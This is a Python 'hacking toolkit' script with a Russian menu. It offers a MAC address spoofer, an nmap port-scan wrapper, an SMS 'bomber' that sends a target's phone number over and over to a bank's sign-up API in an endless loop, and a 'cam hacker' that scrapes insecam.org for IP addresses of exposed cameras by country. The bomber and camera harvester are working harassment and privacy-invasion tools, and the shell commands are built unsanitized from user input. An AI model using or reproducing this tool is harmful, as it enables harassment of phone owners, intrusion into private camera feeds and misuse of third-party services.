#      Author comdata5      # 
import requests
import time
import subprocess
import random
import re


chooseOperations = input("\n 1. Парсинг \n 2. Сменить мак адрес \n 3. Просканировать на порты \n 4. Запустить бомбер \n 5. Взлом камер \n 6. Выход \n Выберите операцию : ")

# Функция парсинга

def parsing():
    print("ВАЖНО!!! ФУНКЦИЯ НЕ ВЫПОЛНЯЕТ ФУНКЦЮ ПАРСИНГА!!! ВРЕМЕННО НЕ РАБОТАЕТ !!!\nСЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ")
    time.sleep(5)    
    domain = input("Введите домен: ")
    url = "https://"+domain+"/"
    response = requests.get(url)
#    time.sleep(3)
    output = input("\n 1. Вывести на экран \n 2. Сохранить данные в файл \n 3. Выход \n Выберите функцию вывода: \n  ")

    if output == "1":
        print(response.content)
    elif output == "2":
        out = open("some.txt", 'w')
        out.write(response.text)
        out.close()
    elif output == "3":
         return domain
    
# Функция смены мак адреса

def mac_changer():
    interface = input("Введите интерфейс: ")
    mac = input("Введите новый мак адрес: ")
    subprocess.call("ifconfig "+interface+" down", shell=True)
    subprocess.call("ifconfig "+interface+" hw ether "+mac, shell=True)
    subprocess.call("ifconfig "+interface+" up", shell=True)
    

# Функция скана портом(nmap)

def scan_port():
    opera = input(" 1. Показать всю информацию о сервере \n 2. Скан определенного порта \n  3. Выход \n Выберите функцию: \n ")
    
    if opera == "1":
        ipadr = input("Введите домен/айпи цели: ")
        subprocess.call("nmap "+ipadr, shell=True)
    elif opera == "2":
        ipadr = input("Введите домен/айпи цели: ")
        port = input("Введите порт(ы): ")
        subprocess.call("nmap -p " +port + " " + ipadr, shell=True)
    elif opera == "3":
        input("Нажмите энтер чтобы выйти......")
            
def bomber():
    _phone = input("Введите номер телефона: ")
    
    _name = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        _phone9 = _phone[1:]
        _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
        _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
        _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
        _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
        _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
        iteration = 0
    while True:
        _email = _name+f'{iteration}'+'@gmail.com'
        email = _name+f'{iteration}'+'@gmail.com'
        try:
            # Посылаем запрос, в котором мы будем хранить номер телефона
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
            # Печатаем что все отправилось успешно
            print('[+] Tinkoff отправлено!')
        except Exception as ex:
            # Если появилась ошибка (ex), мы ее выедем 
            print('[-] Tinkoff не отправлено!' + str(ex))
    
        try:
               iteration += 1
               print(('{} круг пройден.').format(iteration))
        except:
            break
def cam_hackers_country():
#    colorama.init()
    print("""
    \033[1;31m\033[1;37m ██████╗ █████╗ ███╗   ███╗      ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ ███████╗
    ██╔════╝██╔══██╗████╗ ████║      ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔════╝
    ██║     ███████║██╔████╔██║█████╗███████║███████║██║     █████╔╝ █████╗  ██████╔╝███████╗
    ██║     ██╔══██║██║╚██╔╝██║╚════╝██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗╚════██║
    ╚██████╗██║  ██║██║ ╚═╝ ██║      ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║███████║
    \033[1;31m ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝      ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝
    \033[1;31m                                                                        COMDATA5
    \033[1;31m1) \033[1;37mUnited States                \033[1;31m31) \033[1;37mMexico                \033[1;31m61) \033[1;37mMoldova
    \033[1;31m2) \033[1;37mJapan                        \033[1;31m32) \033[1;37mFinland               \033[1;31m62) \033[1;37mNicaragua
    \033[1;31m3) \033[1;37mItaly                        \033[1;31m33) \033[1;37mChina                 \033[1;31m63) \033[1;37mMalta
    \033[1;31m4) \033[1;37mKorea                        \033[1;31m34) \033[1;37mChile                 \033[1;31m64) \033[1;37mTrinidad And Tobago
    \033[1;31m5) \033[1;37mFrance                       \033[1;31m35) \033[1;37mSouth Africa          \033[1;31m65) \033[1;37mSoudi Arabia
    \033[1;31m6) \033[1;37mGermany                      \033[1;31m36) \033[1;37mSlovakia              \033[1;31m66) \033[1;37mCroatia
    \033[1;31m7) \033[1;37mTaiwan                       \033[1;31m37) \033[1;37mHungary               \033[1;31m67) \033[1;37mCyprus
    \033[1;31m8) \033[1;37mRussian Federation           \033[1;31m38) \033[1;37mIreland               \033[1;31m68) \033[1;37mPakistan
    \033[1;31m9) \033[1;37mUnited Kingdom               \033[1;31m39) \033[1;37mEgypt                 \033[1;31m69) \033[1;37mUnited Arab Emirates
    \033[1;31m10) \033[1;37mNetherlands                 \033[1;31m40) \033[1;37mThailand              \033[1;31m70) \033[1;37mKazakhstan
    \033[1;31m11) \033[1;37mCzech Republic              \033[1;31m41) \033[1;37mUkraine               \033[1;31m71) \033[1;37mKuwait
    \033[1;31m12) \033[1;37mTurkey                      \033[1;31m42) \033[1;37mSerbia                \033[1;31m72) \033[1;37mVenezuela
    \033[1;31m13) \033[1;37mAustria                     \033[1;31m43) \033[1;37mHong Kong             \033[1;31m73) \033[1;37mGeorgia
    \033[1;31m14) \033[1;37mSwitzerland                 \033[1;31m44) \033[1;37mGreece                \033[1;31m74) \033[1;37mMontenegro
    \033[1;31m15) \033[1;37mSpain                       \033[1;31m45) \033[1;37mPortugal              \033[1;31m75) \033[1;37mEl Salvador
    \033[1;31m16) \033[1;37mCanada                      \033[1;31m46) \033[1;37mLatvia                \033[1;31m76) \033[1;37mLuxembourg
    \033[1;31m17) \033[1;37mSweden                      \033[1;31m47) \033[1;37mSingapore             \033[1;31m77) \033[1;37mCuracao
    \033[1;31m18) \033[1;37mIsrael                      \033[1;31m48) \033[1;37mIceland               \033[1;31m78) \033[1;37mPuerto Rico
    \033[1;31m19) \033[1;37mIran                        \033[1;31m49) \033[1;37mMalaysia              \033[1;31m79) \033[1;37mCosta Rica
    \033[1;31m20) \033[1;37mPoland                      \033[1;31m50) \033[1;37mColombia              \033[1;31m80) \033[1;37mBelarus
    \033[1;31m21) \033[1;37mIndia                       \033[1;31m51) \033[1;37mTunisia               \033[1;31m81) \033[1;37mAlbania
    \033[1;31m22) \033[1;37mNorway                      \033[1;31m52) \033[1;37mEstonia               \033[1;31m82) \033[1;37mLiechtenstein
    \033[1;31m23) \033[1;37mRomania                     \033[1;31m53) \033[1;37mDominican Republic    \033[1;31m83) \033[1;37mBosnia And Herzegovia
    \033[1;31m24) \033[1;37mViet Nam                    \033[1;31m54) \033[1;37mSloveania             \033[1;31m84) \033[1;37mParaguay
    \033[1;31m25) \033[1;37mBelgium                     \033[1;31m55) \033[1;37mEcuador               \033[1;31m85) \033[1;37mPhilippines
    \033[1;31m26) \033[1;37mBrazil                      \033[1;31m56) \033[1;37mLithuania             \033[1;31m86) \033[1;37mFaroe Islands
    \033[1;31m27) \033[1;37mBulgaria                    \033[1;31m57) \033[1;37mPalestinian           \033[1;31m87) \033[1;37mGuatemala
    \033[1;31m28) \033[1;37mIndonesia                   \033[1;31m58) \033[1;37mNew Zealand           \033[1;31m88) \033[1;37mNepal
    \033[1;31m29) \033[1;37mDenmark                     \033[1;31m59) \033[1;37mBangladeh             \033[1;31m89) \033[1;37mPeru
    \033[1;31m30) \033[1;37mArgentina                   \033[1;31m60) \033[1;37mPanama                \033[1;31m90) \033[1;37mUruguay
                                                              \033[1;31m91) \033[1;37mExtra
    """)
    
    try:
        print()
        countries = ["US", "JP", "IT", "KR", "FR", "DE", "TW", "RU", "GB", "NL",
                     "CZ", "TR", "AT", "CH", "ES", "CA", "SE", "IL", "PL", "IR",
                     "NO", "RO", "IN", "VN", "BE", "BR", "BG", "ID", "DK", "AR",
                     "MX", "FI", "CN", "CL", "ZA", "SK", "HU", "IE", "EG", "TH",
                     "UA", "RS", "HK", "GR", "PT", "LV", "SG", "IS", "MY", "CO",
                     "TN", "EE", "DO", "SI", "EC", "LT", "PS", "NZ", "BD", "PA",
                     "MD", "NI", "MT", "IT", "SA", "HR", "CY", "PK", "AE", "KZ",
                     "KW", "VE", "GE", "ME", "SV", "LU", "CW", "PR", "CR", "BY",
                     "AL", "LI", "BA", "PY", "PH", "FO", "GT", "NP", "PE", "UY",
                     "-"]
        headers = {"User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0"}
    
        num = int(input("OPTIONS : "))
        if num not in range(1, 91+1):
            raise IndexError
    
        country = countries[num-1]
        res = requests.get(
            f"https://www.insecam.org/en/bycountry/{country}", headers=headers
        )
        last_page = re.findall(r'pagenavigator\("\?page=", (\d+)', res.text)[0]
    
        for page in range(int(last_page)):
            res = requests.get(
                f"https://www.insecam.org/en/bycountry/{country}/?page={page}",
                headers=headers
            )
            find_ip = re.findall(r"http://\d+.\d+.\d+.\d+:\d+", res.text)
            for ip in find_ip:
                print("\033[1;31m", ip)
    except:
        pass
    finally:
        print("\033[1;37m")
        exit()
    
    
    

    
if chooseOperations == "1":
    parsing()
elif chooseOperations == "2":
    mac_changer()
elif chooseOperations == "3":
    scan_port()
elif chooseOperations == "4":
    bomber()
elif chooseOperations == "5":
    cam_hackers_country()
else:
    print("Вы вышли....")

